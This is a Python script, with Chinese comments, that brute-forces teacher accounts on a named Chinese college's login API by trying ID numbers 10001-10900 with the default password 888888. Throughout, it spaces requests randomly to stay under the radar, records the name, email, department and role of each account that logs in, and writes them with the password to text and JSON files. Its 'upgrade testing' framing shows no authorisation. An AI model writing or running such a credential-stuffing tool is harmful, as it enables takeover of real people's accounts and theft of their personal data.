#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
哈尔滨信息工程学院教师账号扫描程序
扫描教师账号范围：10001-10900+，默认密码888888
"""

import requests
import json
import time
import random

class TeacherAccountScanner:
    def __init__(self):
        self.base_url = "https://work.greathiit.com/api/user/loginWai"
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.valid_teachers = []
        self.target_count = 15  # 目标找到15个教师账号
        
    def test_teacher_account(self, teacher_id, password="888888"):
        """测试单个教师账号"""
        payload = {
            "userNumber": teacher_id,
            "password": password,
            "autoLogin": True,
            "provider": "account"
        }
        
        try:
            response = requests.post(self.base_url, json=payload, headers=self.headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                # 检查登录成功
                if (data.get("code") == 0 or 
                    (data.get("message") == "ok" and data.get("data"))):
                    
                    user_info = data.get("data", {})
                    name = user_info.get("name", "Unknown")
                    email = user_info.get("email", "")
                    roles = user_info.get("role", [])
                    
                    # 确认是教师角色
                    if "teacher" in roles:
                        result = {
                            "userNumber": teacher_id,
                            "password": password,
                            "name": name,
                            "email": email,
                            "roles": roles,
                            "department": user_info.get("department", ""),
                            "teacherStatus": user_info.get("teacherStatus", "")
                        }
                        
                        self.valid_teachers.append(result)
                        print(f"SUCCESS TEACHER: {teacher_id} - {name} ({email}) - Roles: {roles}")
                        return True
                    else:
                        print(f"LOGIN OK BUT NOT TEACHER: {teacher_id} - Roles: {roles}")
                        return False
                        
        except Exception as e:
            pass  # 忽略错误继续扫描
            
        return False

    def scan_teacher_ranges(self):
        """智能扫描教师账号范围"""
        print("=== Teacher Account Scanner ===")
        print("Scanning range: 10001-10900+")
        print("Target: Find 15 valid teacher accounts")
        print("Default password: 888888")
        print("=" * 50)
        
        found_count = 0
        
        # 策略1: 扫描10001-10100 (前100个)
        print("\nScanning 10001-10100 range...")
        for i in range(10001, 10101):
            if found_count >= self.target_count:
                break
                
            teacher_id = str(i)
            if self.test_teacher_account(teacher_id):
                found_count += 1
                
            # 适当延迟避免请求过快
            time.sleep(random.uniform(0.3, 0.6))
            
            if i % 20 == 0:
                print(f"  Progress: {i-10000}/100, Found: {found_count}")
        
        # 策略2: 如果还没找够，扫描10200-10300
        if found_count < self.target_count:
            print(f"\nContinuing scan 10200-10300 range... (Current: {found_count})")
            for i in range(10200, 10301):
                if found_count >= self.target_count:
                    break
                    
                teacher_id = str(i)
                if self.test_teacher_account(teacher_id):
                    found_count += 1
                    
                time.sleep(random.uniform(0.3, 0.6))
                
                if i % 20 == 0:
                    print(f"  Progress: {i-10200}/100, Found: {found_count}")
        
        # 策略3: 如果还没找够，随机测试其他范围
        if found_count < self.target_count:
            print(f"\nRandom sampling other ranges... (Current: {found_count})")
            test_ranges = [
                (10100, 10200), (10300, 10400), (10500, 10600), 
                (10700, 10800), (10800, 10900)
            ]
            
            for start, end in test_ranges:
                if found_count >= self.target_count:
                    break
                    
                # 从每个范围随机选择10个账号测试
                sample_ids = random.sample(range(start, end), min(10, end-start))
                
                for teacher_id in sample_ids:
                    if found_count >= self.target_count:
                        break
                        
                    if self.test_teacher_account(str(teacher_id)):
                        found_count += 1
                        
                    time.sleep(random.uniform(0.4, 0.7))
                
                print(f"  Tested range {start}-{end}, Found: {found_count}")
        
        self.print_teacher_results()

    def print_teacher_results(self):
        """打印教师扫描结果"""
        print("\n" + "=" * 70)
        print("TEACHER ACCOUNT SCAN RESULTS")
        print("=" * 70)
        
        print(f"Valid teacher accounts found: {len(self.valid_teachers)}")
        print(f"Target achievement: {len(self.valid_teachers)}/{self.target_count}")
        print()
        
        if self.valid_teachers:
            print("VALID TEACHER ACCOUNTS:")
            print("-" * 50)
            for i, teacher in enumerate(self.valid_teachers, 1):
                print(f"{i:2d}. ID: {teacher['userNumber']}")
                print(f"    Name: {teacher['name']}")
                print(f"    Email: {teacher['email']}")
                print(f"    Roles: {teacher['roles']}")
                if teacher['department']:
                    print(f"    Dept: {teacher['department']}")
                print("-" * 30)
        
        self.save_teacher_results()

    def save_teacher_results(self):
        """保存教师扫描结果"""
        timestamp = int(time.time())
        filename = f"teacher_accounts_{timestamp}.txt"
        filepath = f"D:\\ClaudeCode\\AI_Web\\{filename}"
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("School API Teacher Account Scan Results\n")
                f.write("=" * 45 + "\n")
                f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Found: {len(self.valid_teachers)} teacher accounts\n")
                f.write(f"Range: 10001-10900+\n")
                f.write(f"Password: 888888 (default)\n\n")
                
                if self.valid_teachers:
                    f.write("VALID TEACHER ACCOUNTS:\n")
                    f.write("-" * 30 + "\n")
                    
                    for teacher in self.valid_teachers:
                        f.write(f"ID: {teacher['userNumber']}\n")
                        f.write(f"Password: {teacher['password']}\n")
                        f.write(f"Name: {teacher['name']}\n")
                        f.write(f"Email: {teacher['email']}\n")
                        f.write(f"Roles: {teacher['roles']}\n")
                        if teacher['department']:
                            f.write(f"Department: {teacher['department']}\n")
                        if teacher['teacherStatus']:
                            f.write(f"Status: {teacher['teacherStatus']}\n")
                        f.write("-" * 25 + "\n")
                
                f.write("\nUSAGE NOTES:\n")
                f.write("- All accounts use default password: 888888\n")
                f.write("- All users have 'teacher' role\n") 
                f.write("- Ready for School API upgrade testing\n")
                f.write("- Can be used for permission testing\n")
            
            print(f"Results saved: {filepath}")
            
            # 也保存JSON格式方便程序读取
            json_filename = f"teacher_accounts_{timestamp}.json"
            json_filepath = f"D:\\ClaudeCode\\AI_Web\\{json_filename}"
            
            with open(json_filepath, 'w', encoding='utf-8') as f:
                json.dump({
                    "scan_info": {
                        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                        "total_found": len(self.valid_teachers),
                        "target_count": self.target_count,
                        "scan_ranges": ["10001-10100", "10200-10300", "random_samples"]
                    },
                    "teacher_accounts": self.valid_teachers
                }, f, ensure_ascii=False, indent=2)
            
            print(f"JSON results: {json_filepath}")
            
        except Exception as e:
            print(f"Failed to save results: {str(e)}")

def main():
    print("Starting Teacher Account Scanner...")
    print("Scanning teacher ID range: 10001-10900+")
    print("Looking for accounts with 'teacher' role")
    print()
    
    scanner = TeacherAccountScanner()
    scanner.scan_teacher_ranges()
    
    print("\nTeacher account scan completed!")
    print("Ready for multi-role testing when School API upgrades!")

if __name__ == "__main__":
    main()